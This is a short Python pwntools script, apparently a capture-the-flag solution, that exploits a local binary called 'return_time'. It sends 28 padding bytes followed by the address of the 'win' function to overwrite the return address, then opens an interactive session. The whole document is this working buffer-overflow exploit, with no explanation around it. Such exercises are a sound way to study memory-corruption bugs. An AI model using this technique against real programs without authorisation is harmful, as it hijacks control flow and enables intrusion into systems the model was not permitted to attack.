from pwn import *

path='./return_time'

p = process(path)
binary = ELF(path)

payload = b'a'*28
payload += p32(binary.symbols['win'])

print(payload)

p.recvuntil(b'>')
p.sendline(payload)
p.recvline()
p.interactive()